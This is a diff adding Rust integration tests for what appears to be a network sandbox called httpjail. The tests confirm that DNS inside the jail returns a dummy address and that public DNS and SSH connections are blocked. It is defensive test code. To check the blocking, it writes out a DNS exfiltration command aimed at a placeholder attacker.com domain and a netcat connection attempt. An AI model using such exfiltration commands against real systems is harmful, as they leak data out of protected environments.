@@ -556,7 +556,7 @@ pub fn test_jail_dns_resolution<P: JailTestPlatform>() {
         return;
     }
 
-    // Check that DNS resolution worked (should get IP addresses)
+    // Check that DNS resolution worked (should get our dummy IP address)
     assert!(
         !stdout.contains("DNS_FAILED"),
         "[{}] DNS resolution failed inside jail. Output: {}",
@@ -564,18 +564,62 @@ pub fn test_jail_dns_resolution<P: JailTestPlatform>() {
         stdout
     );
 
-    // Should get some IP address response
-    let has_ip = stdout.contains(".")
-        && (stdout.chars().any(|c| c.is_numeric())
-            || stdout.contains("Address")
-            || stdout.contains("answer"));
-
+    // Check that we get our dummy IP (6.6.6.6)
     assert!(
-        has_ip,
-        "[{}] DNS resolution didn't return IP addresses. Output: {}",
+        stdout.contains("6.6.6.6"),
+        "[{}] DNS resolution should return dummy IP 6.6.6.6 to prevent exfiltration. Got: {}",
         P::platform_name(),
         stdout
     );
+
+    // Ensure NO real IPs are returned (no DNS leakage)
+    assert!(
+        !stdout.contains("8.8.8.8") && !stdout.contains("1.1.1.1") && !stdout.contains("172.217"),
+        "[{}] DNS should not return real IPs. Got: {}",
+        P::platform_name(),
+        stdout
+    );
+}
+
+/// Test that DNS exfiltration is prevented
+pub fn test_dns_exfiltration_prevention<P: JailTestPlatform>() {
+    P::require_privileges();
+
+    // Attempt to exfiltrate data via DNS subdomain
+    // This should still return 6.6.6.6, not leak data
+    let mut cmd = httpjail_cmd();
+    cmd.arg("--js")
+        .arg("true")
+        .arg("--")
+        .arg("sh")
+        .arg("-c")
+        .arg("dig +short secret-data-exfil.attacker.com || echo 'DNS_FAILED'");
+
+    let output = cmd.output().expect("Failed to execute httpjail");
+
+    let stdout = String::from_utf8_lossy(&output.stdout);
+    let stderr = String::from_utf8_lossy(&output.stderr);
+
+    println!(
+        "[{}] DNS exfiltration test stdout: {}",
+        P::platform_name(),
+        stdout
+    );
+    println!(
+        "[{}] DNS exfiltration test stderr: {}",
+        P::platform_name(),
+        stderr
+    );
+
+    // Should still get 6.6.6.6, not leak to external DNS
+    if !stdout.contains("DNS_FAILED") {
+        assert!(
+            stdout.contains("6.6.6.6"),
+            "[{}] DNS exfiltration attempt should return dummy IP, not leak data. Got: {}",
+            P::platform_name(),
+            stdout
+        );
+    }
 }
 
 /// Test concurrent jail isolation with different rules
@@ -686,4 +730,101 @@ pub fn test_concurrent_jail_isolation<P: JailTestPlatform>() {
             stdout2
         );
     }
+}
+
+/// Test that attempts to use public DNS servers are blocked
+pub fn test_public_dns_blocked<P: JailTestPlatform>() {
+    P::require_privileges();
+
+    // Try to use Cloudflare's public DNS (1.1.1.1) directly
+    // This should fail as all outbound DNS traffic should be blocked
+    let mut cmd = httpjail_cmd();
+    cmd.arg("--js")
+        .arg("true")
+        .arg("--")
+        .arg("sh")
+        .arg("-c")
+        .arg("dig @1.1.1.1 +short +timeout=2 google.com 2>&1 || echo 'PUBLIC_DNS_BLOCKED'");
+
+    let output = cmd.output().expect("Failed to execute httpjail");
+    let stdout = String::from_utf8_lossy(&output.stdout);
+    let stderr = String::from_utf8_lossy(&output.stderr);
+
+    println!(
+        "[{}] Public DNS test stdout: {}",
+        P::platform_name(),
+        stdout
+    );
+    println!(
+        "[{}] Public DNS test stderr: {}",
+        P::platform_name(),
+        stderr
+    );
+
+    // The query to 1.1.1.1 should fail - either timeout or show blocked
+    assert!(
+        stdout.contains("PUBLIC_DNS_BLOCKED")
+            || stdout.contains("timed out")
+            || stdout.contains("no servers could be reached")
+            || stdout.contains("6.6.6.6")
+            || stderr.contains("timed out")
+            || stderr.contains("no servers could be reached"),
+        "[{}] Expected public DNS (1.1.1.1) to be blocked, but got stdout: {}, stderr: {}",
+        P::platform_name(),
+        stdout,
+        stderr
+    );
+}
+
+/// Test that non-HTTP TCP connections are blocked (e.g., SSH)
+pub fn test_non_http_tcp_services_blocked<P: JailTestPlatform>() {
+    P::require_privileges();
+
+    // Try to connect to GitHub's SSH port - this should be blocked
+    // GitHub SSH always responds with "SSH-2.0-babeld-" banner
+    let mut cmd = httpjail_cmd();
+    cmd.arg("--js")
+        .arg("true")
+        .arg("--")
+        .arg("sh")
+        .arg("-c")
+        // Use timeout to prevent hanging, nc will try to connect to SSH port
+        .arg("timeout 3 nc -v github.com 22 2>&1 || echo 'SSH_BLOCKED'");
+
+    let output = cmd.output().expect("Failed to execute httpjail");
+    let stdout = String::from_utf8_lossy(&output.stdout);
+    let stderr = String::from_utf8_lossy(&output.stderr);
+
+    println!(
+        "[{}] SSH connection test stdout: {}",
+        P::platform_name(),
+        stdout
+    );
+    println!(
+        "[{}] SSH connection test stderr: {}",
+        P::platform_name(),
+        stderr
+    );
+
+    // The connection should be blocked - we should NOT see the SSH banner
+    assert!(
+        !stdout.contains("SSH-2.0"),
+        "[{}] SSH connection should be blocked but got SSH banner in stdout: {}",
+        P::platform_name(),
+        stdout
+    );
+
+    // Should either timeout or be explicitly blocked
+    assert!(
+        stdout.contains("SSH_BLOCKED")
+            || stdout.contains("Connection timed out")
+            || stdout.contains("Connection refused")
+            || stdout.contains("No route to host")
+            || stderr.contains("Connection timed out")
+            || stderr.contains("Connection refused"),
+        "[{}] Expected SSH connection to be blocked, but got stdout: {}, stderr: {}",
+        P::platform_name(),
+        stdout,
+        stderr
+    );
 }
